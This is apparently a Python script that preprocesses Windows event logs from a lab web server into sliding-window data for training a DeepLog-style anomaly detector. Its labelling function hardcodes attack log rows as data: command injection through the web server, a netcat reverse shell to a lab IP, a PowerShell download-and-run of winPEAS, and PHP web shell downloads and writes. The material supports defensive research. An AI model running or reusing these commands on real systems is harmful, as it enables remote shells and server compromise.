import sys

sys.path.append("../")

import os
import gc
import pandas as pd
import numpy as np


sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../")))

from logparser.Drain import LogParser as OriDrain
from logparser.Spell import LogParser as Spell

import csv
from Evtx.Evtx import Evtx
from xml.etree.ElementTree import fromstring, ElementTree
from tqdm import tqdm
import io  # StringIOを使うために必要


class Drain(OriDrain):
    def __init__(
        self,
        log_format,
        indir="./",
        outdir="./result/",
        depth=4,
        st=0.4,
        maxChild=100,
        rex=...,
        keep_para=True,
    ):
        super().__init__(log_format, indir, outdir, depth, st, maxChild, rex, keep_para)

    def log_to_dataframe(self, log_file, regex, headers, logformat):
        """
        CSVファイルをDataFrameに変換し、LineIdを追加する
        """
        try:
            # CSVファイルを直接読み込む
            logdf = pd.read_csv(log_file, names=headers, header=0, encoding="utf-8")

            # デバッグ用: 読み込んだデータを表示
            print("Initial DataFrame:")
            print(logdf.head())

            # LineIdを追加（1から始まる連番）
            logdf.insert(0, "LineId", logdf.index + 1)

            # 総データ数を出力
            print("Total size after reading CSV:", len(logdf))

            return logdf
        except Exception as e:
            # エラー発生時の処理
            print(f"Failed to read CSV file {log_file}: {str(e)}")
            return pd.DataFrame(columns=headers)  # 空のDataFrameを返す


def sliding_window(raw_data, para):
    """
    split logs into sliding windows/session
    :param raw_data: dataframe columns=[timestamp, label, eventid, time duration]
    :param para:{window_size: seconds, step_size: seconds}
    :return: dataframe columns=[eventids, time durations, label]
    """
    log_size = raw_data.shape[0]
    label_data, time_data = raw_data.iloc[:, 1], raw_data.iloc[:, 0]
    logkey_data, deltaT_data = raw_data.iloc[:, 2], raw_data.iloc[:, 3]
    new_data = []
    start_end_index_pair = set()

    start_time = time_data[0]
    end_time = start_time + para["window_size"]
    start_index = 0
    end_index = 0

    # get the first start, end index, end time
    for cur_time in time_data:
        if cur_time < end_time:
            end_index += 1
        else:
            break

    start_end_index_pair.add(tuple([start_index, end_index]))

    # move the start and end index until next sliding window
    num_session = 1
    while end_index < log_size:
        start_time = start_time + para["step_size"]
        end_time = start_time + para["window_size"]
        for i in range(start_index, log_size):
            if time_data[i] < start_time:
                i += 1
            else:
                break
        for j in range(end_index, log_size):
            if time_data[j] < end_time:
                j += 1
            else:
                break
        start_index = i
        end_index = j

        # when start_index == end_index, there is no value in the window
        if start_index != end_index:
            start_end_index_pair.add(tuple([start_index, end_index]))

        num_session += 1
        if num_session % 1000 == 0:
            print("process {} time window".format(num_session), end="\r")

    for start_index, end_index in start_end_index_pair:
        dt = deltaT_data[start_index:end_index].values
        dt[0] = 0
        new_data.append(
            [
                time_data[start_index:end_index].values,
                max(label_data[start_index:end_index]),
                logkey_data[start_index:end_index].values,
                dt,
            ]
        )

    assert len(start_end_index_pair) == len(new_data)
    print(
        "there are %d instances (sliding windows) in this dataset\n"
        % len(start_end_index_pair)
    )
    return pd.DataFrame(new_data, columns=raw_data.columns)


tqdm.pandas()
pd.options.mode.chained_assignment = None

PAD = 0
UNK = 1
START = 2
data_dir = os.path.expanduser("/home/ssakurai/project/log/dataset/amiya/WEB2/")
output_dir = "/home/ssakurai/project/log/dataset/preprocessed/WEB2/"
log_file = "web2.csv"


# In the first column of the log, "-" indicates non-alert messages while others are alert messages.
def count_anomaly():
    total_size = 0
    normal_size = 0
    with open(data_dir + log_file, encoding="utf8") as f:
        for line in f:
            total_size += 1
            if line.split(" ", 1)[0] == "-":
                normal_size += 1
    print(
        "total size {}, abnormal size {}".format(total_size, total_size - normal_size)
    )


def deeplog_file_generator(filename, df, features):
    with open(filename, "w") as f:
        for _, row in df.iterrows():
            for val in zip(*row[features]):
                f.write(",".join([str(v) for v in val]) + " ")
            f.write("\n")


def parse_log(input_dir, output_dir, log_file, parser_type):
    log_format = "<Timestamp> <Computer> <Channel> <EventID> <Level> <RecordID> <RuleTitle> <Details> <ExtraFieldInfo> <Label> <Content>"
    regex = [
        r"(0x)[0-9a-fA-F]+",  # hexadecimal
        r"\d+.\d+.\d+.\d+",
        # r'/\w+( )$'
        r"\d+",
    ]
    keep_para = False
    if parser_type == "drain":
        # the hyper parameter is set according to http://jmzhu.logpai.com/pub/pjhe_icws2017.pdf
        st = 0.3  # Similarity threshold
        depth = 3  # Depth of all leaf nodes
        parser = Drain(
            log_format,
            indir=input_dir,
            outdir=output_dir,
            depth=depth,
            st=st,
            rex=regex,
            keep_para=keep_para,
        )
        parser.parse(log_file)
    elif parser_type == "spell":
        tau = 0.55
        parser = Spell(
            indir=data_dir,
            outdir=output_dir,
            log_format=log_format,
            tau=tau,
            rex=regex,
            keep_para=keep_para,
        )
        parser.parse(log_file)


def prepre(csv_path):

    # 複数の検索対象行をリストとして定義
    input_rows = [
        (
            "2024-03-17 16:29:31.329 +00:00",
            "SWAttckd.swtestnet.com",
            "Sec",
            4688,
            "info",
            1560007,
            "Proc Exec",
            r"""Cmdline: cmd.exe /c ""ping -n 1 1.1.1.1 & curl -OL https://github.com/int0x33/nc.exe/raw/master/nc64.exe"" ¦ Proc: C:\Windows\System32\cmd.exe ¦ PID: 0x2af8 ¦ User: taro ¦ LID: 0x28426d2""",
            r"""MandatoryLabel: S-1-16-8192 ¦ ParentProcessName: C:\xampp\apache\bin\httpd.exe ¦ ProcessId: 0xe5c ¦ SubjectDomainName: SWATTCKD ¦ SubjectUserSid: S-1-5-21-143320146-2996204461-2907325396-1001 ¦ TargetDomainName: - ¦ TargetLogonId: 0x0 ¦ TargetUserName: - ¦ TargetUserSid: S-1-0-0 ¦ TokenElevationType: %%1938""",
        ),
        (
            "2024-03-17 16:38:23.903 +00:00",
            "SWAttckd.swtestnet.com",
            "Sec",
            4688,
            "info",
            1560842,
            "Proc Exec",
            'Cmdline: cmd.exe /c ""ping -n 1 1.1.1.1 & nc64.exe 192.168.142.64 4242 -e cmd"" ¦ Proc: C:\Windows\System32\cmd.exe ¦ PID: 0x1240 ¦ User: taro ¦ LID: 0x28426d2',
            r"MandatoryLabel: S-1-16-8192 ¦ ParentProcessName: C:\xampp\apache\bin\httpd.exe ¦ ProcessId: 0xe5c ¦ SubjectDomainName: SWATTCKD ¦ SubjectUserSid: S-1-5-21-143320146-2996204461-2907325396-1001 ¦ TargetDomainName: - ¦ TargetLogonId: 0x0 ¦ TargetUserName: - ¦ TargetUserSid: S-1-0-0 ¦ TokenElevationType: %%1938",
        ),
        (
            "2024-03-17 16:38:23.988 +00:00",
            "SWAttckd.swtestnet.com",
            "Sec",
            4688,
            "info",
            1560846,
            "Proc Exec",
            r"Cmdline: nc64.exe 192.168.142.64 4242 -e cmd ¦ Proc: C:\xampp\htdocs\nc64.exe ¦ PID: 0x2834 ¦ User: taro ¦ LID: 0x28426d2",
            "CommandLine: nc64.exe 192.168.142.64 4242 -e cmd ¦ MandatoryLabel: S-1-16-8192 ¦ ParentProcessName: C:\Windows\System32\cmd.exe ¦ ProcessId: 0x1240 ¦ SubjectDomainName: SWATTCKD ¦ SubjectUserSid: S-1-5-21-143320146-2996204461-2907325396-1001 ¦ TargetDomainName: - ¦ TargetLogonId: 0x0 ¦ TargetUserName: - ¦ TargetUserSid: S-1-0-0 ¦ TokenElevationType: %%1938",
        ),
        (
            "2024-03-17 16:38:23.988 +00:00",
            "SWAttckd.swtestnet.com",
            "Sec",
            4688,
            "med",
            1560846,
            "Execution in Webserver Root Folder",
            r"Cmdline: nc64.exe 192.168.142.64 4242 -e cmd ¦ Proc: C:\xampp\htdocs\nc64.exe ¦ PID: 0x2834 ¦ User: taro ¦ LID: 0x28426d2",
            "CommandLine: nc64.exe 192.168.142.64 4242 -e cmd ¦ MandatoryLabel: S-1-16-8192 ¦ ParentProcessName: C:\Windows\System32\cmd.exe ¦ ProcessId: 0x1240 ¦ SubjectDomainName: SWATTCKD ¦ SubjectUserSid: S-1-5-21-143320146-2996204461-2907325396-1001 ¦ TargetDomainName: - ¦ TargetLogonId: 0x0 ¦ TargetUserName: - ¦ TargetUserSid: S-1-0-0 ¦ TokenElevationType: %%1938",
        ),
        (
            "2024-03-17 16:38:24.026 +00:00",
            "SWAttckd.swtestnet.com",
            "Sec",
            5156,
            "info",
            1560848,
            "Net Conn",
            r"Proc: \device\harddiskvolume3\xampp\htdocs\nc64.exe ¦ SrcIP: 192.168.142.66 ¦ SrcPort: 60118 ¦ TgtIP: 192.168.142.64 ¦ TgtPort: 4242 ¦ Protocol: 6 ¦ TgtMachineID: S-1-0-0 ¦ TgtSID: S-1-0-0 ¦ PID: 10292",
            "Direction: %%14593 ¦ FilterRTID: 67211 ¦ LayerName: %%14611 ¦ LayerRTID: 48",
        ),
        (
            "2024-03-17 16:43:11.758 +00:00",
            "SWAttckd.swtestnet.com",
            "PwSh",
            4104,
            "high",
            87729,
            "Suspicious PowerShell Invocations - Specific",
            "ScriptBlock: IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')",
            "MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: ¦ ScriptBlockId: 89fb4da9-708b-4ce6-969d-cc0ad496bf5c",
        ),
        (
            "2024-03-17 16:43:12.062 +00:00",
            "SWAttckd.swtestnet.com",
            "PwSh",
            4103,
            "info",
            87730,
            "PwSh Pipeline Exec",
            'Payload: CommandInvocation(New-Object): ""New-Object"" パラメーター バインド(New-Object): 名前=""TypeName""; 値=""Net.WebClient""',
            r"""ContextInfo: 重要度 = Informational ホスト名 = ConsoleHost ホストのバージョン = 5.1.19041.4170 ホスト ID = 3a966b01-0f48-4a67-bd88-4456d8abe953 ホスト アプリケーション = powershell IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1') エンジンのバージョン = 5.1.19041.4170 実行空間 ID = a95a7bfb-e47d-4b17-bedf-b1610be37dab パイプライン ID = 1 コマンド名 = New-Object コマンドの種類 = Cmdlet スクリプト名 = コマンド パス = シーケンス番号 = 16 ユーザー = SWATTCKD\taro 接続されたユーザー = シェル ID = Microsoft.PowerShell ¦ Payload: CommandInvocation(New-Object): ""New-Object"" パラメーター バインド(New-Object): 名前=""TypeName""; 値=""Net.WebClient"" ¦ UserData:""",
        ),
        (
            "2024-03-17 16:43:12.596 +00:00",
            "SWAttckd.swtestnet.com",
            "Defender",
            1116,
            "crit",
            10898,
            "Defender Alert (Severe)",
            r"Threat: VirTool:PowerShell/Cajan.B ¦ Severity: 重大 ¦ Type: ツール ¦ User: SWATTCKD\taro ¦ Path: amsi:_\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            r"Action ID: 9 ¦ Action Name: 該当なし ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 34 ¦ Detection ID: {1EBE312F-F53C-493C-9227-D855D7389701} ¦ Detection Time: 2024-03-17T16:43:12.588Z ¦ Engine Version: AM: 1.1.24020.9, NIS: 1.1.24020.9 ¦ Error Code: 0x00000000 ¦ Error Description: この操作を正しく終了しました。 ¦ Execution ID: 1 ¦ Execution Name: 中断 ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=VirTool:PowerShell/Cajan.B&threatid=2147853070&enterprise=0 ¦ Origin ID: 0 ¦ Origin Name: 不明 ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender ウイルス対策 ¦ Product Version: 4.18.24020.7 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.407.495.0, AS: 1.407.495.0, NIS: 1.407.495.0 ¦ Severity ID: 5 ¦ Source ID: 10 ¦ Source Name: AMSI ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 2147853070 ¦ Type ID: 0 ¦ Type Name: コンクリート ¦ Unused: ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6:",
        ),
        (
            "2024-03-17 16:54:36.499 +00:00",
            "SWAttckd.swtestnet.com",
            "Defender",
            1116,
            "crit",
            10901,
            "Defender Alert (Severe)",
            r"Threat: Behavior:Win32/PossibleRemoteCmdShell.D ¦ Severity: 重大 ¦ Type: 疑わしい動作 ¦ User: ¦ Path: behavior:_process: C:\xampp\htdocs\nc64.exe, pid:2184:206379228286398; process:_pid:2184,ProcessStart:133551680561111027; process:_pid:7384,ProcessStart:133551680561647394 ¦ Proc: Unknown",
            "Action ID: 9 ¦ Action Name: 該当なし ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 46 ¦ Detection ID: {5E3CB71B-60EB-4B64-B598-AFEF4A016931} ¦ Detection Time: 2024-03-17T16:54:36.497Z ¦ Engine Version: AM: 1.1.24020.9, NIS: 1.1.24020.9 ¦ Error Code: 0x00000000 ¦ Error Description: この操作を正しく終了しました。 ¦ Execution ID: 3 ¦ Execution Name: 実行中 ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Behavior:Win32/PossibleRemoteCmdShell.D&threatid=2147841472&enterprise=0 ¦ Origin ID: 0 ¦ Origin Name: 不明 ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender ウイルス対策 ¦ Product Version: 4.18.24020.7 ¦ Security intelligence Version: AV: 1.407.495.0, AS: 1.407.495.0, NIS: 1.407.495.0 ¦ Severity ID: 5 ¦ Source ID: 0 ¦ Source Name: 不明 ¦ State: 1 ¦ Status Code: 1 ¦ Threat ID: 2147841472 ¦ Type ID: 0 ¦ Type Name: コンクリート",
        ),
        (
            "2024-03-17 16:55:06.655 +00:00",
            "SWAttckd.swtestnet.com",
            "Sec",
            4688,
            "high",
            1561392,
            "Suspicious Process By Web Server Process",
            'Cmdline: cmd.exe /c ""ping -n 1 1.1.1.1 & nc64.exe 192.168.142.64 4242 -e cmd"" ¦ Proc: C:\Windows\System32\cmd.exe ¦ PID: 0x980 ¦ User: taro ¦ LID: 0x28426d2',
            r"""MandatoryLabel: S-1-16-8192 ¦ ParentProcessName: C:\xampp\apache\bin\httpd.exe ¦ ProcessId: 0xe5c ¦ SubjectDomainName: SWATTCKD ¦ SubjectUserSid: S-1-5-21-143320146-2996204461-2907325396-1001 ¦ TargetDomainName: - ¦ TargetLogonId: 0x0 ¦ TargetUserName: - ¦ TargetUserSid: S-1-0-0 ¦ TokenElevationType: %%1938""",
        ),
        (
            "2024-03-17 16:55:06.693 +00:00",
            "SWAttckd.swtestnet.com",
            "Sec",
            4688,
            "info",
            1561394,
            "Proc Exec",
            "Cmdline: ping -n 1 1.1.1.1 ¦ Proc: C:\Windows\System32\PING.EXE ¦ PID: 0x2044 ¦ User: taro ¦ LID: 0x28426d2",
            "CommandLine: ping -n 1 1.1.1.1 ¦ MandatoryLabel: S-1-16-8192 ¦ ParentProcessName: C:\Windows\System32\cmd.exe ¦ ProcessId: 0x980 ¦ SubjectDomainName: SWATTCKD ¦ SubjectUserSid: S-1-5-21-143320146-2996204461-2907325396-1001 ¦ TargetDomainName: - ¦ TargetLogonId: 0x0 ¦ TargetUserName: - ¦ TargetUserSid: S-1-0-0 ¦ TokenElevationType: %%1938",
        ),
        (
            "2024-03-17 16:55:06.708 +00:00",
            "SWAttckd.swtestnet.com",
            "Sec",
            5156,
            "info",
            1561395,
            "Net Conn",
            r"Proc: System ¦ SrcIP: 192.168.142.66 ¦ SrcPort: 8 ¦ TgtIP: 1.1.1.1 ¦ TgtPort: 0 ¦ Protocol: 1 ¦ TgtMachineID: S-1-0-0 ¦ TgtSID: S-1-0-0 ¦ PID: 4",
            r"Direction: %%14593 ¦ FilterRTID: 67211 ¦ LayerName: %%14611 ¦ LayerRTID: 48",
        ),
        (
            "2024-03-17 17:01:43.845 +00:00",
            "SWAttckd.swtestnet.com",
            "Sec",
            4688,
            "high",
            1561902,
            "Suspicious Process By Web Server Process",
            'Cmdline: cmd.exe /c ""ping -n 1 1.1.1.1 & curl -OL https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php"" ¦ Proc: C:\Windows\System32\cmd.exe ¦ PID: 0x640 ¦ User: taro ¦ LID: 0x28426d2',
            r"MandatoryLabel: S-1-16-8192 ¦ ParentProcessName: C:\xampp\apache\bin\httpd.exe ¦ ProcessId: 0xe5c ¦ SubjectDomainName: SWATTCKD ¦ SubjectUserSid: S-1-5-21-143320146-2996204461-2907325396-1001 ¦ TargetDomainName: - ¦ TargetLogonId: 0x0 ¦ TargetUserName: - ¦ TargetUserSid: S-1-0-0 ¦ TokenElevationType: %%1938",
        ),
        (
            "2024-03-17 17:01:44.416 +00:00",
            "SWAttckd.swtestnet.com",
            "Defender",
            1116,
            "crit",
            10903,
            "Defender Alert (Severe)",
            r"Threat: Trojan:PHP/WebShell!MSR ¦ Severity: 重大 ¦ Type: トロイの木馬 ¦ User: SWATTCKD\taro ¦ Path: file:_C:\xampp\htdocs\shell.php ¦ Proc: C:\Windows\System32\curl.exe",
            r"""Action ID: 9 ¦ Action Name: 該当なし ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 8 ¦ Detection ID: {64C08CE9-ED25-4655-892E-7F58CB8C2A6F} ¦ Detection Time: 2024-03-17T17:01:44.384Z ¦ Engine Version: AM: 1.1.24020.9, NIS: 1.1.24020.9 ¦ Error Code: 0x00000000 ¦ Error Description: この操作を正しく終了しました。 ¦ Execution ID: 1 ¦ Execution Name: 中断 ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PHP/WebShell!MSR&threatid=2147753919&enterprise=0 ¦ Origin ID: 1 ¦ Origin Name: ローカル コンピューター ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender ウイルス対策 ¦ Product Version: 4.18.24020.7 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.407.495.0, AS: 1.407.495.0, NIS: 1.407.495.0 ¦ Severity ID: 5 ¦ Source ID: 3 ¦ Source Name: リアルタイム保護 ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 2147753919 ¦ Type ID: 0 ¦ Type Name: コンクリート ¦ Unused: ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6:""",
        ),
        (
            "2024-03-17 17:02:24.652 +00:00",
            "SWAttckd.swtestnet.com",
            "Sec",
            4688,
            "high",
            1561974,
            "Suspicious Process By Web Server Process",
            r'Cmdline: cmd.exe /c ""ping -n 1 1.1.1.1 & type shell.php"" ¦ Proc: C:\Windows\System32\cmd.exe ¦ PID: 0x1c18 ¦ User: taro ¦ LID: 0x28426d2',
            r"MandatoryLabel: S-1-16-8192 ¦ ParentProcessName: C:\xampp\apache\bin\httpd.exe ¦ ProcessId: 0xe5c ¦ SubjectDomainName: SWATTCKD ¦ SubjectUserSid: S-1-5-21-143320146-2996204461-2907325396-1001 ¦ TargetDomainName: - ¦ TargetLogonId: 0x0 ¦ TargetUserName: - ¦ TargetUserSid: S-1-0-0 ¦ TokenElevationType: %%1938",
        ),
        (
            "2024-03-17 17:03:59.517 +00:00",
            "SWAttckd.swtestnet.com",
            "Sec",
            4688,
            "high",
            1562020,
            "Suspicious Process By Web Server Process",
            r"""Cmdline: cmd.exe /c ""ping -n 1 1.1.1.1 & echo '<?php system($_GET[""cmd""]);>' > test.php"" ¦ Proc: C:\Windows\System32\cmd.exe ¦ PID: 0x1174 ¦ User: taro ¦ LID: 0x28426d2""",
            r"""MandatoryLabel: S-1-16-8192 ¦ ParentProcessName: C:\xampp\apache\bin\httpd.exe ¦ ProcessId: 0xe5c ¦ SubjectDomainName: SWATTCKD ¦ SubjectUserSid: S-1-5-21-143320146-2996204461-2907325396-1001 ¦ TargetDomainName: - ¦ TargetLogonId: 0x0 ¦ TargetUserName: - ¦ TargetUserSid: S-1-0-0 ¦ TokenElevationType: %%1938""",
        ),
        (
            "2024-03-17 17:08:13.928 +00:00",
            "SWAttckd.swtestnet.com",
            "Sec",
            4688,
            "high",
            1562051,
            "Suspicious Process By Web Server Process",
            r"""Cmdline: cmd.exe /c ""ping -n 1 1.1.1.1 & echo '<?php' > test.php"" ¦ Proc: C:\Windows\System32\cmd.exe ¦ PID: 0x47c ¦ User: taro ¦ LID: 0x28426d2""",
            r"""MandatoryLabel: S-1-16-8192 ¦ ParentProcessName: C:\xampp\apache\bin\httpd.exe ¦ ProcessId: 0xe5c ¦ SubjectDomainName: SWATTCKD ¦ SubjectUserSid: S-1-5-21-143320146-2996204461-2907325396-1001 ¦ TargetDomainName: - ¦ TargetLogonId: 0x0 ¦ TargetUserName: - ¦ TargetUserSid: S-1-0-0 ¦ TokenElevationType: %%1938""",
        ),
        (
            "2024-03-17 17:13:06.919 +00:00",
            "SWAttckd.swtestnet.com",
            "Sec",
            4688,
            "high",
            1562177,
            "Curl Download And Execute Combination",
            r"""Cmdline: cmd.exe /c ""ping -n 1 1.1.1.1 & curl -OL http://192.168.142.64:8080/test.php"" ¦ Proc: C:\Windows\System32\cmd.exe ¦ PID: 0x21a4 ¦ User: taro ¦ LID: 0x28426d2""",
            r"""MandatoryLabel: S-1-16-8192 ¦ ParentProcessName: C:\xampp\apache\bin\httpd.exe ¦ ProcessId: 0xe5c ¦ SubjectDomainName: SWATTCKD ¦ SubjectUserSid: S-1-5-21-143320146-2996204461-2907325396-1001 ¦ TargetDomainName: - ¦ TargetLogonId: 0x0 ¦ TargetUserName: - ¦ TargetUserSid: S-1-0-0 ¦ TokenElevationType: %%1938""",
        ),
        (
            "2024-03-17 17:13:06.919 +00:00",
            "SWAttckd.swtestnet.com",
            "Sec",
            4688,
            "high",
            1562177,
            "Suspicious Process By Web Server Process",
            'Cmdline: cmd.exe /c ""ping -n 1 1.1.1.1 & curl -OL http://192.168.142.64:8080/test.php"" ¦ Proc: C:\Windows\System32\cmd.exe ¦ PID: 0x21a4 ¦ User: taro ¦ LID: 0x28426d2',
            r"MandatoryLabel: S-1-16-8192 ¦ ParentProcessName: C:\xampp\apache\bin\httpd.exe ¦ ProcessId: 0xe5c ¦ SubjectDomainName: SWATTCKD ¦ SubjectUserSid: S-1-5-21-143320146-2996204461-2907325396-1001 ¦ TargetDomainName: - ¦ TargetLogonId: 0x0 ¦ TargetUserName: - ¦ TargetUserSid: S-1-0-0 ¦ TokenElevationType: %%1938",
        ),
        (
            "2024-03-17 17:13:07.005 +00:00",
            "SWAttckd.swtestnet.com",
            "Sec",
            4688,
            "info",
            1562181,
            "Proc Exec",
            "Cmdline: curl -OL http://192.168.142.64:8080/test.php ¦ Proc: C:\Windows\System32\curl.exe ¦ PID: 0x24b0 ¦ User: taro ¦ LID: 0x28426d2",
            "CommandLine: curl -OL http://192.168.142.64:8080/test.php ¦ MandatoryLabel: S-1-16-8192 ¦ ParentProcessName: C:\Windows\System32\cmd.exe ¦ ProcessId: 0x21a4 ¦ SubjectDomainName: SWATTCKD ¦ SubjectUserSid: S-1-5-21-143320146-2996204461-2907325396-1001 ¦ TargetDomainName: - ¦ TargetLogonId: 0x0 ¦ TargetUserName: - ¦ TargetUserSid: S-1-0-0 ¦ TokenElevationType: %%1938",
        ),
        (
            "2024-03-17 17:13:07.005 +00:00",
            "SWAttckd.swtestnet.com",
            "Sec",
            4688,
            "low",
            1562181,
            "Curl.EXE Execution",
            "Cmdline: curl -OL http://192.168.142.64:8080/test.php ¦ Proc: C:\Windows\System32\curl.exe ¦ PID: 0x24b0 ¦ User: taro ¦ LID: 0x28426d2",
            "CommandLine: curl -OL http://192.168.142.64:8080/test.php ¦ MandatoryLabel: S-1-16-8192 ¦ ParentProcessName: C:\Windows\System32\cmd.exe ¦ ProcessId: 0x21a4 ¦ SubjectDomainName: SWATTCKD ¦ SubjectUserSid: S-1-5-21-143320146-2996204461-2907325396-1001 ¦ TargetDomainName: - ¦ TargetLogonId: 0x0 ¦ TargetUserName: - ¦ TargetUserSid: S-1-0-0 ¦ TokenElevationType: %%1938",
        ),
        (
            "2024-03-17 17:13:07.065 +00:00",
            "SWAttckd.swtestnet.com",
            "Defender",
            1116,
            "crit",
            10907,
            "Defender Alert (Severe)",
            r"Threat: Trojan:PHP/Chopper.A!dha ¦ Severity: 重大 ¦ Type: トロイの木馬 ¦ User: ¦ Path: file:_C:\xampp\htdocs\test.php ¦ Proc: Unknown",
            "Action ID: 9 ¦ Action Name: 該当なし ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 8 ¦ Detection ID: {68680970-1101-4D0E-A73A-71EE70169899} ¦ Detection Time: 2024-03-17T17:13:07.038Z ¦ Engine Version: AM: 1.1.24020.9, NIS: 1.1.24020.9 ¦ Error Code: 0x00000000 ¦ Error Description: この操作を正しく終了しました。 ¦ Execution ID: 1 ¦ Execution Name: 中断 ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PHP/Chopper.A!dha&threatid=2147761223&enterprise=0 ¦ Origin ID: 1 ¦ Origin Name: ローカル コンピューター ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender ウイルス対策 ¦ Product Version: 4.18.24020.7 ¦ Security intelligence Version: AV: 1.407.495.0, AS: 1.407.495.0, NIS: 1.407.495.0 ¦ Severity ID: 5 ¦ Source ID: 3 ¦ Source Name: リアルタイム保護 ¦ State: 1 ¦ Status Code: 1 ¦ Threat ID: 2147761223 ¦ Type ID: 0 ¦ Type Name: コンクリート",
        ),
    ]

    data = pd.read_csv(
        "/home/ssakurai/project/log/dataset/amiya/WEB2/WEB2_20240402_timeline.csv"
    )

    # 一致した行の行番号を保存するリスト
    matched_indices = []

    # 各input_rowについて一致する行を検索
    for input_row in input_rows:
        # input_rowをCSV形式の文字列に変換
        input_row_csv = ",".join(f'"{str(item)}"' for item in input_row)

        # 1行をリストに変換
        row_values = (
            pd.read_csv(io.StringIO(input_row_csv), header=None).iloc[0].tolist()
        )

        # DataFrame内で一致する行を検索
        matched_rows = data.loc[(data == row_values).all(axis=1)]

        if not matched_rows.empty:
            print("一致する行が見つかりました:")
            # print(matched_rows.index)
            # 一致した行のインデックスを保存
            matched_indices.extend(matched_rows.index.tolist())
        else:
            print("一致する行は見つかりませんでした。")

    # 行番号を表示
    print(len(input_rows), "一致した行番号:", matched_indices)
    data["Label"] = "-"
    data.loc[matched_indices, "Label"] = "anomaly"
    data["Content"] = "Channel=" + data["Channel"] + "|Details=" + data["Details"]

    data.to_csv(csv_path)


if __name__ == "__main__":
    csv_path = f"{data_dir}{log_file}"

    prepre(csv_path)

    parse_log(data_dir, output_dir, log_file, "drain")

    #########
    # Count #
    #########
    count_anomaly()

    ##################
    # Transformation #
    ##################
    #     # mins
    window_size = 5
    step_size = 1
    train_ratio = 0.4

    df = pd.read_csv(f"{output_dir}{log_file}_structured.csv")

    #     # data preprocess
    df["datetime"] = pd.to_datetime(df["Timestamp"], format="%Y-%m-%d %H:%M:%S.%f %z")
    df["Label"] = df["Label"].apply(lambda x: int(x != "-"))
    df["timestamp"] = df["datetime"].values.astype(np.int64) // 10**9
    df["deltaT"] = df["datetime"].diff() / np.timedelta64(1, "s")
    df["deltaT"] = df["deltaT"].fillna(0)
    #     # convert time to UTC timestamp
    df["deltaT"] = df["datetime"].apply(
        lambda t: (t - pd.Timestamp("1970-01-01", tz="UTC")) // pd.Timedelta("1s")
    )

    # sampling with fixed window
    # features = ["EventId", "deltaT"]
    # target = "Label"
    # deeplog_df = deeplog_df_transfer(df, features, target, "datetime", window_size=args.w)
    # deeplog_df.dropna(subset=[target], inplace=True)

    # sampling with sliding window
    deeplog_df = sliding_window(
        df[["timestamp", "Label", "EventId", "deltaT"]],
        para={"window_size": int(window_size) * 60, "step_size": int(step_size) * 60},
    )

    #     #########
    #     # Train #
    #     #########
    df_normal = deeplog_df[deeplog_df["Label"] == 0]
    df_normal = df_normal.sample(frac=1, random_state=12).reset_index(
        drop=True
    )  # shuffle
    normal_len = len(df_normal)

    #     #########
    #     # Train #
    #     #########

    train_ratio = 0.4
    train_len = int(normal_len * train_ratio)

    train = df_normal[:train_len]
    deeplog_file_generator(os.path.join(output_dir, "train4"), train, ["EventId"])

    print("training size {}".format(train_len))

    #     # ###############
    #     # # Test Normal #
    #     # ###############
    test_normal = df_normal[train_len:]
    deeplog_file_generator(
        os.path.join(output_dir, "test_normal6"), test_normal, ["EventId"]
    )

    print("test normal size {}".format(normal_len - train_len))

    #     #########
    #     # Train #
    #     #########

    train_ratio = 0.6
    train_len = int(normal_len * train_ratio)

    train = df_normal[:train_len]
    deeplog_file_generator(os.path.join(output_dir, "train6"), train, ["EventId"])

    print("training size {}".format(train_len))

    #     # ###############
    #     # # Test Normal #
    #     # ###############
    test_normal = df_normal[train_len:]
    deeplog_file_generator(
        os.path.join(output_dir, "test_normal4"), test_normal, ["EventId"]
    )

    print("test normal size {}".format(normal_len - train_len))

    #     #########
    #     # Train #
    #     #########

    train_ratio = 0.8
    train_len = int(normal_len * train_ratio)

    train = df_normal[:train_len]
    deeplog_file_generator(os.path.join(output_dir, "train8"), train, ["EventId"])

    print("training size {}".format(train_len))

    #     # ###############
    #     # # Test Normal #
    #     # ###############
    test_normal = df_normal[train_len:]
    deeplog_file_generator(
        os.path.join(output_dir, "test_normal2"), test_normal, ["EventId"]
    )

    print("test normal size {}".format(normal_len - train_len))

    train_ratio = 1
    train_len = int(normal_len * train_ratio)

    train = df_normal[:train_len]
    deeplog_file_generator(os.path.join(output_dir, "train"), train, ["EventId"])

    print("training size {}".format(train_len))

    del df_normal
    del train
    # del test_normal
    gc.collect()

    # #################
    # # Test Abnormal #
    # #################
    df_abnormal = deeplog_df[deeplog_df["Label"] == 1]
